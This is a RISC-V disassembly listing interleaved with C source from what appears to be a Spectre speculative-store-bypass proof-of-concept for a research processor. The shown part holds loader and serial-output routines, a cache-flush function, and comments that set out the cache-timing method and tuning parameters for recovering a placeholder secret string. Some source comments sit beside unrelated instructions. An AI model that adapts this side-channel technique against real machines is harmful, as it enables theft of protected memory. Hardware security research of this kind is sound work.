    18c4:	00a2a023          	sw	a0,0(t0) # 40002000 <__rodata_end+0x3ffff4ee>
    18c8:	7ffff297          	auipc	t0,0x7ffff
    18cc:	a5828293          	addi	t0,t0,-1448 # 80000320 <__data_start+0x320>
    18d0:	0002a083          	lw	ra,0(t0)
    18d4:	0042a503          	lw	a0,4(t0)
    18d8:	0082a583          	lw	a1,8(t0)
    18dc:	7ffff517          	auipc	a0,0x7ffff
    18e0:	a6450513          	addi	a0,a0,-1436 # 80000340 <__data_start+0x340>
    18e4:	00050293          	mv	t0,a0
    18e8:	40002337          	lui	t1,0x40002
    18ec:	0002c503          	lbu	a0,0(t0)
    18f0:	00128293          	addi	t0,t0,1
    18f4:	00050663          	beqz	a0,1900 <trap_dump_registers+0x304>
    18f8:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    18fc:	ff1ff06f          	j	18ec <trap_dump_registers+0x2f0>
    1900:	00438393          	addi	t2,t2,4
    1904:	cfc39ce3          	bne	t2,t3,15fc <trap_dump_registers>
    1908:	7ffff517          	auipc	a0,0x7ffff
    190c:	a4850513          	addi	a0,a0,-1464 # 80000350 <__data_start+0x350>
    1910:	00050293          	mv	t0,a0
    1914:	40002337          	lui	t1,0x40002
    1918:	0002c503          	lbu	a0,0(t0)
    191c:	00128293          	addi	t0,t0,1
    1920:	00050663          	beqz	a0,192c <abort>
    1924:	00a32023          	sw	a0,0(t1) # 40002000 <__rodata_end+0x3ffff4ee>
    1928:	ff1ff06f          	j	1918 <trap_dump_registers+0x31c>

0000192c <abort>:
    192c:	ed8ff06f          	j	1004 <_end>
    1930:	00012003          	lw	zero,0(sp)
    1934:	00412083          	lw	ra,4(sp)
    1938:	00812103          	lw	sp,8(sp)
    193c:	00c12183          	lw	gp,12(sp)
    1940:	01012203          	lw	tp,16(sp)
    1944:	01412283          	lw	t0,20(sp)
    1948:	01812303          	lw	t1,24(sp)
    194c:	01c12383          	lw	t2,28(sp)
    1950:	02012403          	lw	s0,32(sp)
    1954:	02412483          	lw	s1,36(sp)
    1958:	02812503          	lw	a0,40(sp)
    195c:	02c12583          	lw	a1,44(sp)
    1960:	03012603          	lw	a2,48(sp)
    1964:	03412683          	lw	a3,52(sp)
    1968:	03812703          	lw	a4,56(sp)
    196c:	03c12783          	lw	a5,60(sp)
    1970:	04012803          	lw	a6,64(sp)
    1974:	04412883          	lw	a7,68(sp)
    1978:	04812903          	lw	s2,72(sp)
    197c:	04c12983          	lw	s3,76(sp)
    1980:	05012a03          	lw	s4,80(sp)
    1984:	05412a83          	lw	s5,84(sp)
    1988:	05812b03          	lw	s6,88(sp)
    198c:	05c12b83          	lw	s7,92(sp)
    1990:	06012c03          	lw	s8,96(sp)
    1994:	06412c83          	lw	s9,100(sp)
    1998:	06812d03          	lw	s10,104(sp)
    199c:	06c12d83          	lw	s11,108(sp)
    19a0:	07012e03          	lw	t3,112(sp)
    19a4:	07412e83          	lw	t4,116(sp)
    19a8:	07812f03          	lw	t5,120(sp)
    19ac:	07c12f83          	lw	t6,124(sp)
    19b0:	08010113          	addi	sp,sp,128
    19b4:	30200073          	mret
    19b8:	0000                	.insn	2, 0x
	...

000019bc <_rsd_memcpy>:
extern int __bss_start;
extern int __bss_end;

#define ram_start 0x80000000

static void* _rsd_memcpy(void* dest_, const void* src_, size_t n) {
    19bc:	fd010113          	addi	sp,sp,-48
    19c0:	02812623          	sw	s0,44(sp)
    19c4:	03010413          	addi	s0,sp,48
    19c8:	fca42e23          	sw	a0,-36(s0)
    19cc:	fcb42c23          	sw	a1,-40(s0)
    19d0:	fcc42a23          	sw	a2,-44(s0)
    uint8_t* dest = dest_;
    19d4:	fdc42783          	lw	a5,-36(s0)
    19d8:	fef42423          	sw	a5,-24(s0)
    const uint8_t* src = src_;
    19dc:	fd842783          	lw	a5,-40(s0)
    19e0:	fef42223          	sw	a5,-28(s0)

    for (size_t i = 0; i < n; i++) {
    19e4:	fe042623          	sw	zero,-20(s0)
    19e8:	0300006f          	j	1a18 <_rsd_memcpy+0x5c>
        dest[i] = src[i];
    19ec:	fe442703          	lw	a4,-28(s0)
    19f0:	fec42783          	lw	a5,-20(s0)
    19f4:	00f70733          	add	a4,a4,a5
    19f8:	fe842683          	lw	a3,-24(s0)
    19fc:	fec42783          	lw	a5,-20(s0)
    1a00:	00f687b3          	add	a5,a3,a5
    1a04:	00074703          	lbu	a4,0(a4)
    1a08:	00e78023          	sb	a4,0(a5)
    for (size_t i = 0; i < n; i++) {
    1a0c:	fec42783          	lw	a5,-20(s0)
    1a10:	00178793          	addi	a5,a5,1
    1a14:	fef42623          	sw	a5,-20(s0)
    1a18:	fec42703          	lw	a4,-20(s0)
    1a1c:	fd442783          	lw	a5,-44(s0)
    1a20:	fcf766e3          	bltu	a4,a5,19ec <_rsd_memcpy+0x30>
    }
    return dest;
    1a24:	fe842783          	lw	a5,-24(s0)
}
    1a28:	00078513          	mv	a0,a5
    1a2c:	02c12403          	lw	s0,44(sp)
    1a30:	03010113          	addi	sp,sp,48
    1a34:	00008067          	ret

00001a38 <_rsd_memset>:

static void* _rsd_memset(void* str_, int c, size_t n) {
    1a38:	fd010113          	addi	sp,sp,-48
    1a3c:	02812623          	sw	s0,44(sp)
    1a40:	03010413          	addi	s0,sp,48
    1a44:	fca42e23          	sw	a0,-36(s0)
    1a48:	fcb42c23          	sw	a1,-40(s0)
    1a4c:	fcc42a23          	sw	a2,-44(s0)
    uint8_t* str = str_;
    1a50:	fdc42783          	lw	a5,-36(s0)
    1a54:	fef42423          	sw	a5,-24(s0)
    for (size_t i = 0; i < n; i++) {
    1a58:	fe042623          	sw	zero,-20(s0)
    1a5c:	0280006f          	j	1a84 <_rsd_memset+0x4c>
        str[i] = (uint8_t)c;
    1a60:	fe842703          	lw	a4,-24(s0)
    1a64:	fec42783          	lw	a5,-20(s0)
    1a68:	00f707b3          	add	a5,a4,a5
    1a6c:	fd842703          	lw	a4,-40(s0)
    1a70:	0ff77713          	zext.b	a4,a4
    1a74:	00e78023          	sb	a4,0(a5)
    for (size_t i = 0; i < n; i++) {
    1a78:	fec42783          	lw	a5,-20(s0)
    1a7c:	00178793          	addi	a5,a5,1
    1a80:	fef42623          	sw	a5,-20(s0)
    1a84:	fec42703          	lw	a4,-20(s0)
    1a88:	fd442783          	lw	a5,-44(s0)
    1a8c:	fcf76ae3          	bltu	a4,a5,1a60 <_rsd_memset+0x28>
    }
    return str;
    1a90:	fe842783          	lw	a5,-24(s0)
}
    1a94:	00078513          	mv	a0,a5
    1a98:	02c12403          	lw	s0,44(sp)
    1a9c:	03010113          	addi	sp,sp,48
    1aa0:	00008067          	ret

00001aa4 <_load>:

void _load() {
    1aa4:	fe010113          	addi	sp,sp,-32
    1aa8:	00112e23          	sw	ra,28(sp)
    1aac:	00812c23          	sw	s0,24(sp)
    1ab0:	02010413          	addi	s0,sp,32
    // The core function of the RSD loader called at the very beggining of run time.
    // It copies data in .data and .sdata sections from ROM to RAM
    // and sets 0 in .bss and .sbss sections in RAM.
    size_t data_size = (size_t)&__data_end - (size_t)&__data_start;
    1ab4:	800007b7          	lui	a5,0x80000
    1ab8:	39878713          	addi	a4,a5,920 # 80000398 <dummyMem>
    1abc:	800007b7          	lui	a5,0x80000
    1ac0:	00078793          	mv	a5,a5
    1ac4:	40f707b3          	sub	a5,a4,a5
    1ac8:	fef42623          	sw	a5,-20(s0)
    size_t bss_size = (size_t)&__bss_end - (size_t)&__bss_start;
    1acc:	800297b7          	lui	a5,0x80029
    1ad0:	4ac78713          	addi	a4,a5,1196 # 800294ac <__bss_end>
    1ad4:	800007b7          	lui	a5,0x80000
    1ad8:	39878793          	addi	a5,a5,920 # 80000398 <dummyMem>
    1adc:	40f707b3          	sub	a5,a4,a5
    1ae0:	fef42423          	sw	a5,-24(s0)
    _rsd_memcpy((void*)ram_start, &__rodata_end, data_size);
    1ae4:	fec42603          	lw	a2,-20(s0)
    1ae8:	000037b7          	lui	a5,0x3
    1aec:	b1278593          	addi	a1,a5,-1262 # 2b12 <__rodata_end>
    1af0:	80000537          	lui	a0,0x80000
    1af4:	ec9ff0ef          	jal	19bc <_rsd_memcpy>
    _rsd_memset(&__bss_start, 0, bss_size);
    1af8:	fe842603          	lw	a2,-24(s0)
    1afc:	00000593          	li	a1,0
    1b00:	800007b7          	lui	a5,0x80000
    1b04:	39878513          	addi	a0,a5,920 # 80000398 <dummyMem>
    1b08:	f31ff0ef          	jal	1a38 <_rsd_memset>
}
    1b0c:	00000013          	nop
    1b10:	01c12083          	lw	ra,28(sp)
    1b14:	01812403          	lw	s0,24(sp)
    1b18:	02010113          	addi	sp,sp,32
    1b1c:	00008067          	ret

00001b20 <memcpy>:
//#include <time.h> // For time(NULL)
#include "util_riscv.h"
#include "cache.h"

// Remind: Spectre SSB  will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.

    1b20:	fd010113          	addi	sp,sp,-48
    1b24:	02812623          	sw	s0,44(sp)
    1b28:	03010413          	addi	s0,sp,48
    1b2c:	fca42e23          	sw	a0,-36(s0)
    1b30:	fcb42c23          	sw	a1,-40(s0)
    1b34:	fcc42a23          	sw	a2,-44(s0)
/* >>>>>> Mostly used parameters for debugging are listed below. >>>>>> */
    1b38:	fdc42783          	lw	a5,-36(s0)
    1b3c:	fef42423          	sw	a5,-24(s0)
/*
    1b40:	fd842783          	lw	a5,-40(s0)
    1b44:	fef42223          	sw	a5,-28(s0)
 * 1. Variable and function names are in lower camel case, i.e. camelCase, or sneak case, i.e. sneak_case.
    1b48:	fe042623          	sw	zero,-20(s0)
    1b4c:	0300006f          	j	1b7c <memcpy+0x5c>
    1b50:	fe442703          	lw	a4,-28(s0)
    1b54:	fec42783          	lw	a5,-20(s0)
    1b58:	00f70733          	add	a4,a4,a5
    1b5c:	fe842683          	lw	a3,-24(s0)
    1b60:	fec42783          	lw	a5,-20(s0)
    1b64:	00f687b3          	add	a5,a3,a5
    1b68:	00074703          	lbu	a4,0(a4)
    1b6c:	00e78023          	sb	a4,0(a5)
    1b70:	fec42783          	lw	a5,-20(s0)
    1b74:	00178793          	addi	a5,a5,1
    1b78:	fef42623          	sw	a5,-20(s0)
    1b7c:	fec42703          	lw	a4,-20(s0)
    1b80:	fd442783          	lw	a5,-44(s0)
    1b84:	fcf766e3          	bltu	a4,a5,1b50 <memcpy+0x30>
 * 2. (at)input, (at)inout, etc may be used for preprocessors.
    1b88:	fe842783          	lw	a5,-24(s0)
 */
    1b8c:	00078513          	mv	a0,a5
    1b90:	02c12403          	lw	s0,44(sp)
    1b94:	03010113          	addi	sp,sp,48
    1b98:	00008067          	ret

00001b9c <serial_wait>:

/**
 * The following parameters vary with machines and are obtained from experiments,
    1b9c:	ff010113          	addi	sp,sp,-16
    1ba0:	00812623          	sw	s0,12(sp)
    1ba4:	01010413          	addi	s0,sp,16
 * using "control variates method" and "binary/half-interval/logarithmic search/".
 */
//#define TRAIN_TIMES 24 // (Spectre-SSB does not need training.) Times to train the predictor. There shall be an ideal value for each machine.
// Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
#define ATTACK_ROUNDS 10 // Effective when 3, 10, 20, etc. Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
// For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
    1ba8:	00000013          	nop
    1bac:	00c12403          	lw	s0,12(sp)
    1bb0:	01010113          	addi	sp,sp,16
    1bb4:	00008067          	ret

00001bb8 <serial_out_dec>:
#define CACHE_HIT_THRESHOLD 37 // Narrow between 37-38. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
// To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.

    1bb8:	bd010113          	addi	sp,sp,-1072
    1bbc:	42112623          	sw	ra,1068(sp)
    1bc0:	42812423          	sw	s0,1064(sp)
    1bc4:	43010413          	addi	s0,sp,1072
    1bc8:	bca42e23          	sw	a0,-1060(s0)
/* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
    1bcc:	400027b7          	lui	a5,0x40002
    1bd0:	fef42023          	sw	a5,-32(s0)

#define SECRET_STRING "RISCV"
#define SECRET_LENGTH 5

    1bd4:	fe042423          	sw	zero,-24(s0)
#define ARRAY_STRIDE L1_DCACHE_BLOCK_BYTES
    1bd8:	fe042223          	sw	zero,-28(s0)
/**
 * Reference from Lipp et al, 2018, Meltdown:
    1bdc:	bdc42783          	lw	a5,-1060(s0)
    1be0:	0007dc63          	bgez	a5,1bf8 <serial_out_dec+0x40>
 * Based on the value of data in this example, a different part of the cache is accessed when executing the memory access out of order.
 * As data is multiplied by L1_DCACHE_BLOCK_BYTES (found with getconf PAGE_SIZE, typically 4096), data accesses to probe array are scattered over the array
    1be4:	00100793          	li	a5,1
    1be8:	fef42223          	sw	a5,-28(s0)
 * with a distance of L1_DCACHE_BLOCK_BYTES Bytes (typically 4 KB, assuming an 1 B data type for probe array, e.g. uint8_t).
 * Thus, there is an injective mapping from the value of data to a memory page, i.e., different values for data never result in an access to the same page.
    1bec:	bdc42783          	lw	a5,-1060(s0)
    1bf0:	40f007b3          	neg	a5,a5
    1bf4:	bcf42e23          	sw	a5,-1060(s0)
 * Consequently, if a cache line of a page is cached, we know the value of data.
 * The spreading over pages eliminates false positives due to the prefetcher, as the prefetcher cannot access data across page boundaries.
 * This prevents the hardware prefetcher from loading adjacent memory locations into the cache as well.
 */
    1bf8:	bdc42703          	lw	a4,-1060(s0)
    1bfc:	00a00793          	li	a5,10
    1c00:	02f767b3          	rem	a5,a4,a5
    1c04:	03078713          	addi	a4,a5,48 # 40002030 <__rodata_end+0x3ffff51e>
    1c08:	fe842783          	lw	a5,-24(s0)
    1c0c:	00279793          	slli	a5,a5,0x2
    1c10:	ff078793          	addi	a5,a5,-16
    1c14:	008787b3          	add	a5,a5,s0
    1c18:	bee7a823          	sw	a4,-1040(a5)

    1c1c:	fe842783          	lw	a5,-24(s0)
    1c20:	00178793          	addi	a5,a5,1
    1c24:	fef42423          	sw	a5,-24(s0)
/**
    1c28:	bdc42703          	lw	a4,-1060(s0)
    1c2c:	00a00793          	li	a5,10
    1c30:	02f747b3          	div	a5,a4,a5
    1c34:	bcf42e23          	sw	a5,-1060(s0)
 * Assume the attacker knows following information in advance:
    1c38:	bdc42783          	lw	a5,-1060(s0)
    1c3c:	fa079ee3          	bnez	a5,1bf8 <serial_out_dec+0x40>
 * - Hardware specifications
 * - Control of an guideArray (address, contents, size) and an probeArray (contents, size)
    1c40:	fe442783          	lw	a5,-28(s0)
    1c44:	02078463          	beqz	a5,1c6c <serial_out_dec+0xb4>
 * - The start address of secretString (but no way to directly access contents of secretString)
    1c48:	fe842783          	lw	a5,-24(s0)
    1c4c:	00279793          	slli	a5,a5,0x2
    1c50:	ff078793          	addi	a5,a5,-16
    1c54:	008787b3          	add	a5,a5,s0
    1c58:	02d00713          	li	a4,45
    1c5c:	bee7a823          	sw	a4,-1040(a5)
 * - The character set of secretString and its size (such as extended ASCII which is 0~255, 8bit).
    1c60:	fe842783          	lw	a5,-24(s0)
    1c64:	00178793          	addi	a5,a5,1
    1c68:	fef42423          	sw	a5,-24(s0)
 */

/**
    1c6c:	fe842783          	lw	a5,-24(s0)
    1c70:	fff78793          	addi	a5,a5,-1
    1c74:	fef42623          	sw	a5,-20(s0)
    1c78:	0300006f          	j	1ca8 <serial_out_dec+0xf0>
 * Although there are no direct accesses to secretString, after being "trained" for a certain times,
    1c7c:	f21ff0ef          	jal	1b9c <serial_wait>
    1c80:	fec42783          	lw	a5,-20(s0)
    1c84:	00279793          	slli	a5,a5,0x2
    1c88:	ff078793          	addi	a5,a5,-16
    1c8c:	008787b3          	add	a5,a5,s0
    1c90:	bf07a703          	lw	a4,-1040(a5)
    1c94:	fe042783          	lw	a5,-32(s0)
    1c98:	00e7a023          	sw	a4,0(a5)
/**
    1c9c:	fec42783          	lw	a5,-20(s0)
    1ca0:	fff78793          	addi	a5,a5,-1
    1ca4:	fef42623          	sw	a5,-20(s0)
    1ca8:	fec42783          	lw	a5,-20(s0)
    1cac:	fc07d8e3          	bgez	a5,1c7c <serial_out_dec+0xc4>
 * vulnerable processors will "grow accustomed to" legitimate inputs (such as branch-not-taken) fed deliberately by the attacker, 
 * and mistakenly predict that succeeding illegitimate attempts wll also be true, fetching secretString into cache.
    1cb0:	00000013          	nop
    1cb4:	00000013          	nop
    1cb8:	42c12083          	lw	ra,1068(sp)
    1cbc:	42812403          	lw	s0,1064(sp)
    1cc0:	43010113          	addi	sp,sp,1072
    1cc4:	00008067          	ret

00001cc8 <serial_out_hex>:
 * The attacker can then exploit the shortened access time (because of cache) and apply cache SCAs methods,
 * to infer characters of secretString one by one, using brutal force (exhausting all 256 possibities of extended ASCII).
 */
    1cc8:	fb010113          	addi	sp,sp,-80
    1ccc:	04112623          	sw	ra,76(sp)
    1cd0:	04812423          	sw	s0,72(sp)
    1cd4:	05010413          	addi	s0,sp,80
    1cd8:	faa42e23          	sw	a0,-68(s0)

    1cdc:	400027b7          	lui	a5,0x40002
    1ce0:	fef42223          	sw	a5,-28(s0)
#define RESULT_ARRAY_SIZE 256
/**
 * In this example program, all secret characters are in extended ASCII codes (0~255, 8bit).
 * Ofc you may change it for others like Unicode, but that will complicate everything,
    1ce4:	fe042423          	sw	zero,-24(s0)
 * and will also introduce REALLY high performance requirements.
 */
    1ce8:	1980006f          	j	1e80 <serial_out_hex+0x1b8>

    1cec:	fbc42783          	lw	a5,-68(s0)
    1cf0:	00f7f793          	andi	a5,a5,15
    1cf4:	14078e63          	beqz	a5,1e50 <serial_out_hex+0x188>
#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
    1cf8:	fbc42783          	lw	a5,-68(s0)
    1cfc:	00f7f713          	andi	a4,a5,15
    1d00:	00100793          	li	a5,1
    1d04:	14f70263          	beq	a4,a5,1e48 <serial_out_hex+0x180>
/**
    1d08:	fbc42783          	lw	a5,-68(s0)
    1d0c:	00f7f713          	andi	a4,a5,15
    1d10:	00200793          	li	a5,2
    1d14:	12f70663          	beq	a4,a5,1e40 <serial_out_hex+0x178>
 * The size of probeArray can not be smaller than the max element of guideArray.
    1d18:	fbc42783          	lw	a5,-68(s0)
    1d1c:	00f7f713          	andi	a4,a5,15
    1d20:	00300793          	li	a5,3
    1d24:	10f70a63          	beq	a4,a5,1e38 <serial_out_hex+0x170>
 * Also the size of guideArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
    1d28:	fbc42783          	lw	a5,-68(s0)
    1d2c:	00f7f713          	andi	a4,a5,15
    1d30:	00400793          	li	a5,4
    1d34:	0ef70e63          	beq	a4,a5,1e30 <serial_out_hex+0x168>
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
    1d38:	fbc42783          	lw	a5,-68(s0)
    1d3c:	00f7f713          	andi	a4,a5,15
    1d40:	00500793          	li	a5,5
    1d44:	0ef70263          	beq	a4,a5,1e28 <serial_out_hex+0x160>
 * (Basically there is no point in designating these parameters of guideArray separately.)
    1d48:	fbc42783          	lw	a5,-68(s0)
    1d4c:	00f7f713          	andi	a4,a5,15
    1d50:	00600793          	li	a5,6
    1d54:	0cf70663          	beq	a4,a5,1e20 <serial_out_hex+0x158>
 *
    1d58:	fbc42783          	lw	a5,-68(s0)
    1d5c:	00f7f713          	andi	a4,a5,15
    1d60:	00700793          	li	a5,7
    1d64:	0af70a63          	beq	a4,a5,1e18 <serial_out_hex+0x150>
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
    1d68:	fbc42783          	lw	a5,-68(s0)
    1d6c:	00f7f713          	andi	a4,a5,15
    1d70:	00800793          	li	a5,8
    1d74:	08f70e63          	beq	a4,a5,1e10 <serial_out_hex+0x148>
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
    1d78:	fbc42783          	lw	a5,-68(s0)
    1d7c:	00f7f713          	andi	a4,a5,15
    1d80:	00900793          	li	a5,9
    1d84:	08f70263          	beq	a4,a5,1e08 <serial_out_hex+0x140>
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient.
    1d88:	fbc42783          	lw	a5,-68(s0)
    1d8c:	00f7f713          	andi	a4,a5,15
    1d90:	00a00793          	li	a5,10
    1d94:	06f70663          	beq	a4,a5,1e00 <serial_out_hex+0x138>
 */
    1d98:	fbc42783          	lw	a5,-68(s0)
    1d9c:	00f7f713          	andi	a4,a5,15
    1da0:	00b00793          	li	a5,11
    1da4:	04f70a63          	beq	a4,a5,1df8 <serial_out_hex+0x130>

    1da8:	fbc42783          	lw	a5,-68(s0)
    1dac:	00f7f713          	andi	a4,a5,15
    1db0:	00c00793          	li	a5,12
    1db4:	02f70e63          	beq	a4,a5,1df0 <serial_out_hex+0x128>
// Memory address for displaying characters (in place of printf)
    1db8:	fbc42783          	lw	a5,-68(s0)
    1dbc:	00f7f713          	andi	a4,a5,15
    1dc0:	00d00793          	li	a5,13
    1dc4:	02f70263          	beq	a4,a5,1de8 <serial_out_hex+0x120>
volatile char* outputAddr = (char*)0x40002000;
    1dc8:	fbc42783          	lw	a5,-68(s0)
    1dcc:	00f7f713          	andi	a4,a5,15
    1dd0:	00e00793          	li	a5,14
    1dd4:	00f71663          	bne	a4,a5,1de0 <serial_out_hex+0x118>
    1dd8:	06500793          	li	a5,101
    1ddc:	0780006f          	j	1e54 <serial_out_hex+0x18c>
    1de0:	06600793          	li	a5,102
    1de4:	0700006f          	j	1e54 <serial_out_hex+0x18c>
// Memory address for displaying characters (in place of printf)
    1de8:	06400793          	li	a5,100
    1dec:	0680006f          	j	1e54 <serial_out_hex+0x18c>

    1df0:	06300793          	li	a5,99
    1df4:	0600006f          	j	1e54 <serial_out_hex+0x18c>
 */
    1df8:	06200793          	li	a5,98
    1dfc:	0580006f          	j	1e54 <serial_out_hex+0x18c>
 * For simplicity it is to set equal to RESULT_ARRAY_SIZE and has been proved to be sufficient.
    1e00:	06100793          	li	a5,97
    1e04:	0500006f          	j	1e54 <serial_out_hex+0x18c>
 * and be a power of 2, e. g. legal value 512, 1024, etc. and illegal value 384.
    1e08:	03900793          	li	a5,57
    1e0c:	0480006f          	j	1e54 <serial_out_hex+0x18c>
 * At the same time, ARRAY_SIZE_FACTOR must be no smaller than RESULT_ARRAY_SIZE (which is further restricted by character set size),
    1e10:	03800793          	li	a5,56
    1e14:	0400006f          	j	1e54 <serial_out_hex+0x18c>
 *
    1e18:	03700793          	li	a5,55
    1e1c:	0380006f          	j	1e54 <serial_out_hex+0x18c>
 * (Basically there is no point in designating these parameters of guideArray separately.)
    1e20:	03600793          	li	a5,54
    1e24:	0300006f          	j	1e54 <serial_out_hex+0x18c>
 * For simplicity they are set the same in this program using ARRAY_SIZE_FACTOR.
    1e28:	03500793          	li	a5,53
    1e2c:	0280006f          	j	1e54 <serial_out_hex+0x18c>
 * Also the size of guideArray can not be smaller than "size of the probeArray divided by ARRAY_STRIDE".
    1e30:	03400793          	li	a5,52
    1e34:	0200006f          	j	1e54 <serial_out_hex+0x18c>
 * The size of probeArray can not be smaller than the max element of guideArray.
    1e38:	03300793          	li	a5,51
    1e3c:	0180006f          	j	1e54 <serial_out_hex+0x18c>
/**
    1e40:	03200793          	li	a5,50
    1e44:	0100006f          	j	1e54 <serial_out_hex+0x18c>
#define ARRAY_SIZE_FACTOR RESULT_ARRAY_SIZE
    1e48:	03100793          	li	a5,49
    1e4c:	0080006f          	j	1e54 <serial_out_hex+0x18c>

    1e50:	03000793          	li	a5,48
    1e54:	fe842703          	lw	a4,-24(s0)
    1e58:	00271713          	slli	a4,a4,0x2
    1e5c:	ff070713          	addi	a4,a4,-16
    1e60:	00870733          	add	a4,a4,s0
    1e64:	fcf72a23          	sw	a5,-44(a4)

    1e68:	fe842783          	lw	a5,-24(s0)
    1e6c:	00178793          	addi	a5,a5,1 # 40002001 <__rodata_end+0x3ffff4ef>
    1e70:	fef42423          	sw	a5,-24(s0)
uint8_t guideArray[ARRAY_SIZE_FACTOR];
    1e74:	fbc42783          	lw	a5,-68(s0)
    1e78:	4047d793          	srai	a5,a5,0x4
    1e7c:	faf42e23          	sw	a5,-68(s0)
 */
    1e80:	fe842703          	lw	a4,-24(s0)
    1e84:	00700793          	li	a5,7
    1e88:	e6e7d2e3          	bge	a5,a4,1cec <serial_out_hex+0x24>
uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];

#include "gadget.h"
    1e8c:	fe842783          	lw	a5,-24(s0)
    1e90:	fff78793          	addi	a5,a5,-1
    1e94:	fef42623          	sw	a5,-20(s0)
    1e98:	0300006f          	j	1ec8 <serial_out_hex+0x200>

    1e9c:	d01ff0ef          	jal	1b9c <serial_wait>
    1ea0:	fec42783          	lw	a5,-20(s0)
    1ea4:	00279793          	slli	a5,a5,0x2
    1ea8:	ff078793          	addi	a5,a5,-16
    1eac:	008787b3          	add	a5,a5,s0
    1eb0:	fd47a703          	lw	a4,-44(a5)
    1eb4:	fe442783          	lw	a5,-28(s0)
    1eb8:	00e7a023          	sw	a4,0(a5)
#include "gadget.h"
    1ebc:	fec42783          	lw	a5,-20(s0)
    1ec0:	fff78793          	addi	a5,a5,-1
    1ec4:	fef42623          	sw	a5,-20(s0)
    1ec8:	fec42783          	lw	a5,-20(s0)
    1ecc:	fc07d8e3          	bgez	a5,1e9c <serial_out_hex+0x1d4>
uint32_t mixed_i;
uint32_t dummy;
    1ed0:	00000013          	nop
    1ed4:	00000013          	nop
    1ed8:	04c12083          	lw	ra,76(sp)
    1edc:	04812403          	lw	s0,72(sp)
    1ee0:	05010113          	addi	sp,sp,80
    1ee4:	00008067          	ret

00001ee8 <serial_out_char>:

// Get the highest and second highest hit values in results().
// Each index (from 0 to RESULT_ARRAY_SIZE-1) of results() represents a character,
    1ee8:	fd010113          	addi	sp,sp,-48
    1eec:	02112623          	sw	ra,44(sp)
    1ef0:	02812423          	sw	s0,40(sp)
    1ef4:	03010413          	addi	s0,sp,48
    1ef8:	00050793          	mv	a5,a0
    1efc:	fcf40fa3          	sb	a5,-33(s0)
// and its corresponding stored array value means cache hits.
    1f00:	400027b7          	lui	a5,0x40002
    1f04:	fef42623          	sw	a5,-20(s0)
static uint32_t results[RESULT_ARRAY_SIZE];
    1f08:	c95ff0ef          	jal	1b9c <serial_wait>
    1f0c:	fec42783          	lw	a5,-20(s0)
    1f10:	fdf44703          	lbu	a4,-33(s0)
    1f14:	00e78023          	sb	a4,0(a5) # 40002000 <__rodata_end+0x3ffff4ee>
uint8_t hitIdx[2];
    1f18:	00000013          	nop
    1f1c:	02c12083          	lw	ra,44(sp)
    1f20:	02812403          	lw	s0,40(sp)
    1f24:	03010113          	addi	sp,sp,48
    1f28:	00008067          	ret

00001f2c <flushCache>:
 * Clears any set that has the same set bits as the input address range.
 * Note: This does not work if you are trying to flush dummyMem out of the cache.
 * @param memAddr starting address to clear the cache
 * @param memSize size of the data to remove in bytes
 */
void flushCache(uint32_t memAddr, uint32_t memSize){
    1f2c:	fc010113          	addi	sp,sp,-64
    1f30:	02812e23          	sw	s0,60(sp)
    1f34:	04010413          	addi	s0,sp,64
    1f38:	fca42623          	sw	a0,-52(s0)
    1f3c:	fcb42423          	sw	a1,-56(s0)
    
    // Find out the quantity of blocks that need to be cleared.
    uint32_t numSetsClear = memSize >> L1_DCACHE_BLOCK_BITS; // This operation removes block bits and shifts set bits to the right.
    1f40:	fc842783          	lw	a5,-56(s0)
    1f44:	0037d793          	srli	a5,a5,0x3
    1f48:	fef42623          	sw	a5,-20(s0)
	//  Offset bits other than all 0s indicate that it is not the beginning block of a set, so additional clearing is required.
    if ((memSize & OFFSET_MASK) != 0){
    1f4c:	fc842783          	lw	a5,-56(s0)
    1f50:	0077f793          	andi	a5,a5,7
    1f54:	00078863          	beqz	a5,1f64 <flushCache+0x38>
        numSetsClear += 1;
    1f58:	fec42783          	lw	a5,-20(s0)
    1f5c:	00178793          	addi	a5,a5,1
    1f60:	fef42623          	sw	a5,-20(s0)
    }
	// Flush the entire cache with no rollover, which makes this flushCache function finish faster.
    if (numSetsClear > L1_DCACHE_SETS){
    1f64:	fec42703          	lw	a4,-20(s0)
    1f68:	000017b7          	lui	a5,0x1
    1f6c:	80078793          	addi	a5,a5,-2048 # 800 <_start-0x800>
    1f70:	00e7f863          	bgeu	a5,a4,1f80 <flushCache+0x54>
        numSetsClear = L1_DCACHE_SETS;
    1f74:	000017b7          	lui	a5,0x1
    1f78:	80078793          	addi	a5,a5,-2048 # 800 <_start-0x800>
    1f7c:	fef42623          	sw	a5,-20(s0)

    // This memory address alignedMem is the start of a contiguous set of memory that will fit inside the cache.
    // Thus it has the following properties:
    // 1. dummyMem <= alignedMem < dummyMem + sizeof(dummyMem) (since set bits and offset are cleared)
    // 2. alignedMem has set bits = 0 and offset = 0, only tag bits remain.
    uint32_t alignedMem = (((uint32_t)&dummyMem) + L1_DCACHE_CAPACITY_BYTES) & TAG_MASK;
    1f80:	800007b7          	lui	a5,0x80000
    1f84:	39878713          	addi	a4,a5,920 # 80000398 <dummyMem>
    1f88:	000087b7          	lui	a5,0x8
    1f8c:	00f70733          	add	a4,a4,a5
    1f90:	ffffc7b7          	lui	a5,0xffffc
    1f94:	00f777b3          	and	a5,a4,a5
    1f98:	fef42023          	sw	a5,-32(s0)
	// "&" is the address-of operator. The type of the result is "pointer to the operand."

    for (uint32_t i = 0; i < numSetsClear; ++i){
    1f9c:	fe042423          	sw	zero,-24(s0)
